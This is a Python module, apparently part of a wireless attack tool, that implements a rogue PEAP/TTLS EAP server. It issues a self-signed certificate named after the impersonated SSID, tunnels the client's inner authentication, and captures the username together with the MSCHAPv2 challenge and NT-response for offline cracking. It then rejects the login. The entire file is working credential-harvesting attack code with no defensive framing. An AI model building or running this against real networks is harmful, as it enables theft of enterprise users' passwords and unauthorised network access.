from __future__ import annotations

import hashlib
import logging
import os
import ssl
import struct
import tempfile
import time
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from enum import Enum
from pathlib import Path

logger = logging.getLogger(__name__)

EAP_IDENTITY = 1
EAP_TTLS = 21
EAP_MSCHAPv2 = 26
EAP_PEAP = 25

EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_SUCCESS = 3
EAP_FAILURE = 4

TLS_LENGTH_INCLUDED = 0x80
TLS_MORE_FRAGMENTS = 0x40
TLS_START = 0x20

_TLS_CHUNK = 1024


class Method(Enum):
    PEAP = "PEAP"
    TTLS = "TTLS"


@dataclass
class Capture:
    ssid: str
    username: str
    method: str
    password: str | None = None
    challenge: str | None = None
    response: str | None = None
    client_mac: str | None = None
    timestamp: float = 0.0


class EapServer:
    def __init__(self, ssid: str, method: Method = Method.PEAP):
        self.ssid = ssid
        self.method = method
        self._id = 0
        self._inner_id = 0
        self._state = "identity"
        self._inner = "identity"
        self._username: str | None = None
        self._context: ssl.SSLContext | None = None
        self._ssl: ssl.SSLObject | None = None
        self._in_bio: ssl.MemoryBIO | None = None
        self._out_bio: ssl.MemoryBIO | None = None
        self._cert_tmpdir: tempfile.TemporaryDirectory | None = None
        self.captured: Capture | None = None
        self._authenticator_challenge = b""
        self._tls_fragment_buffer = b""
        self._tls_more_fragments = False
        self._tls_length = 0
        self._tx: list[bytes] = []

    def _outer_type(self) -> int:
        return EAP_PEAP if self.method == Method.PEAP else EAP_TTLS

    def _generate_cert(self):
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, self.ssid),
            x509.NameAttribute(NameOID.COMMON_NAME, self.ssid),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.now(UTC))
            .not_valid_after(datetime.now(UTC) + timedelta(days=365))
            .sign(key, hashes.SHA256())
        )
        self._cert_tmpdir = tempfile.TemporaryDirectory()
        cert_path = Path(self._cert_tmpdir.name) / "cert.pem"
        key_path = Path(self._cert_tmpdir.name) / "key.pem"
        cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        key_path.write_bytes(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
        return cert_path, key_path

    def _init_tls(self):
        if self._cert_tmpdir is not None:
            self._cert_tmpdir.cleanup()
            self._cert_tmpdir = None
        cert_path, key_path = self._generate_cert()
        self._context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self._context.minimum_version = ssl.TLSVersion.TLSv1_2
        self._context.maximum_version = ssl.TLSVersion.TLSv1_2
        self._context.load_cert_chain(str(cert_path), str(key_path))
        self._in_bio = ssl.MemoryBIO()
        self._out_bio = ssl.MemoryBIO()
        self._ssl = self._context.wrap_bio(self._in_bio, self._out_bio, server_side=True)

    def _eap_packet(self, code: int, eid: int, type_: int, data: bytes = b"") -> bytes:
        return struct.pack(">BBHB", code, eid, 5 + len(data), type_) + data

    def _eap_success(self, eid: int) -> bytes:
        return struct.pack(">BBH", EAP_SUCCESS, eid, 4)

    def _eap_failure(self, eid: int) -> bytes:
        return struct.pack(">BBH", EAP_FAILURE, eid, 4)

    def request_identity(self) -> bytes:
        self._state = "identity"
        return self._eap_packet(EAP_REQUEST, self._id, EAP_IDENTITY)

    def _mschapv2_challenge(self, eid: int, challenge: bytes) -> bytes:
        if len(challenge) != 16:
            raise ValueError("MSCHAPv2 challenge must be exactly 16 bytes")
        ms = struct.pack(">BBHB", 1, eid, 21, 16) + challenge
        return self._eap_packet(EAP_REQUEST, eid, EAP_MSCHAPv2, ms)

    def _write_tls(self, plaintext: bytes) -> bytes:
        if self._ssl is None or self._out_bio is None:
            return plaintext
        try:
            self._ssl.write(plaintext)
        except ssl.SSLWantWriteError:
            pass
        except ssl.SSLError as exc:
            logger.debug("tls write failed: %s", exc)
        return self._out_bio.read()

    def _read_tls(self, ciphertext: bytes) -> bytes:
        if self._ssl is None or self._in_bio is None:
            return ciphertext
        if ciphertext:
            self._in_bio.write(ciphertext)
        try:
            return self._ssl.read(16384)
        except ssl.SSLWantReadError:
            return b""
        except ssl.SSLError as exc:
            logger.debug("tls read failed: %s", exc)
            return b""

    def _do_handshake(self) -> bool:
        if self._ssl is None:
            return False
        try:
            self._ssl.do_handshake()
            return True
        except ssl.SSLWantReadError:
            return False
        except ssl.SSLError as exc:
            logger.debug("tls handshake failed: %s", exc)
            return False

    def _drain(self) -> bytes:
        if self._out_bio is None:
            return b""
        return self._out_bio.read()

    def _queue_flight(self, flight: bytes) -> None:
        offset = 0
        total = len(flight)
        first = True
        while first or offset < total:
            chunk = flight[offset:offset + _TLS_CHUNK]
            offset += len(chunk)
            flags = 0
            body = chunk
            if first:
                flags |= TLS_LENGTH_INCLUDED
                body = struct.pack(">I", total) + chunk
                first = False
            if offset < total:
                flags |= TLS_MORE_FRAGMENTS
            self._id = (self._id + 1) % 256
            self._tx.append(self._eap_packet(
                EAP_REQUEST, self._id, self._outer_type(), bytes([flags]) + body))
            if total == 0:
                break

    def _pop(self) -> list[bytes]:
        if not self._tx:
            return [self._eap_failure(self._id)]
        return [self._tx.pop(0)]

    def _client_tls(self, data: bytes) -> bytes | None:
        if len(data) <= 5:
            return b""
        flags = data[5]
        if self._tls_more_fragments and not (flags & TLS_LENGTH_INCLUDED):
            self._tls_fragment_buffer += data[6:]
            if len(self._tls_fragment_buffer) < self._tls_length:
                return None
            done = self._tls_fragment_buffer[:self._tls_length]
            self._tls_fragment_buffer = b""
            self._tls_more_fragments = False
            return done
        if flags & TLS_LENGTH_INCLUDED and len(data) >= 10:
            total = struct.unpack(">I", data[6:10])[0]
            chunk = data[10:]
            if len(chunk) < total:
                self._tls_fragment_buffer = chunk
                self._tls_more_fragments = True
                self._tls_length = total
                return None
            return chunk[:total]
        return data[6:]

    def process(self, data: bytes) -> list[bytes]:
        if len(data) < 5:
            return [self._eap_failure(0)]
        code = data[0]
        self._id = data[1]
        if code != EAP_RESPONSE:
            return [self._eap_failure(self._id)]
        if self._state == "identity":
            return self._on_identity(data)
        if self._state == "tls":
            return self._on_tls(data)
        if self._state == "inner":
            return self._on_inner(data)
        return [self._eap_failure(self._id)]

    def _on_identity(self, data: bytes) -> list[bytes]:
        if len(data) < 6 or data[4] != EAP_IDENTITY:
            return [self._eap_failure(self._id)]
        self._username = data[5:].decode("utf-8", errors="replace")
        logger.info("identity %s", self._username)
        self._init_tls()
        self._state = "tls"
        self._id = (self._id + 1) % 256
        return [self._eap_packet(EAP_REQUEST, self._id, self._outer_type(), bytes([TLS_START]))]

    def _on_tls(self, data: bytes) -> list[bytes]:
        if self._tx:
            incoming = self._client_tls(data)
            if incoming:
                self._read_tls(incoming)
                self._do_handshake()
                extra = self._drain()
                if extra:
                    self._queue_flight(extra)
            return self._pop()
        incoming = self._client_tls(data)
        if incoming is None:
            self._id = (self._id + 1) % 256
            return [self._eap_packet(EAP_REQUEST, self._id, self._outer_type(), bytes([0]))]
        if incoming:
            self._read_tls(incoming)
        done = self._do_handshake()
        extra = self._drain()
        if extra:
            self._queue_flight(extra)
        if self._tx:
            return self._pop()
        if done:
            return self._begin_inner()
        self._id = (self._id + 1) % 256
        return [self._eap_packet(EAP_REQUEST, self._id, self._outer_type(), bytes([0]))]

    def _begin_inner(self) -> list[bytes]:
        self._state = "inner"
        self._inner = "identity"
        self._authenticator_challenge = os.urandom(16)
        self._inner_id = (self._inner_id + 1) % 256
        return self._seal(self._eap_packet(EAP_REQUEST, self._inner_id, EAP_IDENTITY))

    def _seal(self, inner: bytes) -> list[bytes]:
        if self.method == Method.TTLS:
            inner = self._wrap_ttls_avp(inner)
        flight = self._write_tls(inner)
        if flight:
            self._queue_flight(flight)
        return self._pop()

    def _on_inner(self, data: bytes) -> list[bytes]:
        if self._tx:
            incoming = self._client_tls(data)
            if incoming:
                self._read_tls(incoming)
            return self._pop()
        incoming = self._client_tls(data)
        if incoming is None:
            self._id = (self._id + 1) % 256
            return [self._eap_packet(EAP_REQUEST, self._id, self._outer_type(), bytes([0]))]
        plain = self._read_tls(incoming)
        if not plain:
            extra = self._drain()
            if extra:
                self._queue_flight(extra)
                return self._pop()
            return [self._eap_failure(self._id)]
        if self.method == Method.TTLS:
            plain = self._unwrap_ttls_avp(plain)
        if self._inner == "identity":
            if len(plain) >= 5 and plain[0] == EAP_RESPONSE and plain[4] == EAP_IDENTITY:
                name = plain[5:].decode("utf-8", errors="replace")
                if name:
                    self._username = name
            self._inner = "mschap"
            self._inner_id = (self._inner_id + 1) % 256
            return self._seal(self._mschapv2_challenge(
                self._inner_id, self._authenticator_challenge))
        body = plain
        if len(plain) >= 5 and plain[0] == EAP_RESPONSE and plain[4] == EAP_MSCHAPv2:
            body = plain[5:]
        return self._handle_mschapv2(body)

    def _handle_mschapv2(self, data: bytes) -> list[bytes]:
        if len(data) < 53 or data[0] != 2 or data[4] != 49:
            logger.debug("mschapv2 response short: %d", len(data))
            return [self._eap_failure(self._id)]
        peer = data[5:21]
        nt_response = data[29:53]
        raw_name = data[53:].split(b"\x00", 1)[0].decode("utf-8", errors="replace")
        user = raw_name.split("\\")[-1].split("@")[0] or (self._username or "unknown")
        challenge_hash = hashlib.sha1(
            peer + self._authenticator_challenge + user.encode()
        ).digest()[:8]
        self.captured = Capture(
            ssid=self.ssid,
            username=user,
            method="MSCHAPv2",
            challenge=challenge_hash.hex(),
            response=nt_response.hex(),
            timestamp=time.time(),
        )
        logger.info("captured %s", user)
        return [self._eap_failure(self._id)]

    def _wrap_ttls_avp(self, data: bytes) -> bytes:
        avp = struct.pack(">I", 79) + struct.pack(">I", (0x40 << 24) | (8 + len(data))) + data
        padding = (-len(avp)) & 3
        if padding:
            avp += b"\x00" * padding
        return avp

    def _unwrap_ttls_avp(self, data: bytes) -> bytes:
        if len(data) < 12:
            return data
        code = struct.unpack(">I", data[:4])[0]
        if code != 79:
            return data
        length = struct.unpack(">I", data[4:8])[0] & 0x00FFFFFF
        return data[8:length]

    def cleanup(self):
        if self._cert_tmpdir:
            self._cert_tmpdir.cleanup()
            self._cert_tmpdir = None
